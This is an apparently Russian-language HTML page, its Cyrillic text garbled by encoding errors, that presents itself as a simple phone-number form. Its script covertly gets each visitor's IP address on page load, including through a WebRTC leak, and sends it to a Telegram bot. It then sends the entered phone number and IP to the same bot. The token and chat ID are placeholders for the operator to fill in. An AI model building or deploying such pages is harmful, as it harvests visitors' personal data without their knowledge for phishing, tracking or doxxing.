<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>–°–±–æ—Ä –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞</title>
<style>
body { font-family: Arial, sans-serif; background:#f0f0f0; margin:0; padding:20px; }
.container { max-width:600px; margin:auto; background:#fff; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
h1 { text-align: center; color:#333; }
#ip { margin-top:10px; font-size:1rem; }
#input-section { margin-top:30px; display:flex; flex-direction:column; }
input[type="tel"] { padding:10px; font-size:1rem; border-radius:5px; border:1px solid #ccc; margin-bottom:10px; }
button { padding:10px; font-size:1rem; border:none; border-radius:5px; background:#4CAF50; color:#fff; cursor:pointer; }
button:hover { background:#45a049; }
#status { margin-top:20px; font-size:1rem; color:green; }
</style>
</head>
<body>

<div class="container">
<h1>–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞</h1>
<div id="ip">–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ IP...</div>
<div id="input-section">
<input type="tel" id="phone" placeholder="+7 (999) 999-99-99" />
<button id="send">–û—Ç–ø—Ä–∞–≤–∏—Ç—å</button>
</div>
<div id="status"></div>
</div>

<script>
const BOT_TOKEN = '–í–ê–®_BOT_TOKEN'; // –≤—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ —Å–≤–æ–π —Ç–æ–∫–µ–Ω
const CHAT_ID = '–í–ê–®_CHAT_ID';     // –≤—Å—Ç–∞–≤—å—Ç–µ —Å—é–¥–∞ —Å–≤–æ–π —á–∞—Ç ID

let userIP = '–Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω';

// –û—Ç–ø—Ä–∞–≤–∫–∞ —Å–æ–æ–±—â–µ–Ω–∏–π –≤ –¢–µ–ª–µ–≥—É
async function sendToTelegram(text) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
}

// –°–æ–±–∏—Ä–∞–µ–º IP —á–µ—Ä–µ–∑ —Å—Ç–æ—Ä–æ–Ω–Ω–∏–µ —Å–µ—Ä–≤–∏—Å—ã
async function fetchIP() {
    const services = [
        'https://api.ipify.org?format=json',
        'https://api.myip.com/',
        'https://api.ipapi.co/json/'
    ];
    for (let url of services) {
        try {
            const res = await fetch(url);
            if (!res.ok) continue;
            const data = await res.json();
            if (data.ip) {
                userIP = data.ip;
                document.getElementById('ip').textContent = '–í–∞—à IP: ' + userIP;
                await sendToTelegram(`üõ∞ –ù–æ–≤—ã–π –∑–∞—Ö–æ–¥\nIP: ${userIP}`);
                return;
            }
        } catch(e) { /* –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ */ }
    }
    // fallback WebRTC
    try {
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel('');
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = e => {
            if (!e.candidate) return;
            const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
            if (match) {
                userIP = match[1];
                document.getElementById('ip').textContent = '–í–∞—à IP: ' + userIP;
                sendToTelegram(`üõ∞ –ù–æ–≤—ã–π –∑–∞—Ö–æ–¥\nIP: ${userIP}`);
            }
        };
        setTimeout(()=>{}, 2000);
    } catch(e) {
        // –Ω–∏—á–µ–≥–æ –Ω–µ –¥–µ–ª–∞–µ–º
    }
}

document.getElementById('send').onclick = async ()=> {
    const phone = document.getElementById('phone').value.trim();
    if (!phone) {
        alert('–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –Ω–æ–º–µ—Ä');
        return;
    }
    await sendToTelegram(`üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${phone}\nIP: ${userIP}`);
    document.getElementById('status').textContent = '–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã. –°–ø–∞—Å–∏–±–æ!';
    document.getElementById('input-section').style.display='none';
}

// –ó–∞–ø—É—Å–∫ —Å–±–æ—Ä–∫–∏ IP –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
fetchIP();
</script>
</body>
</html>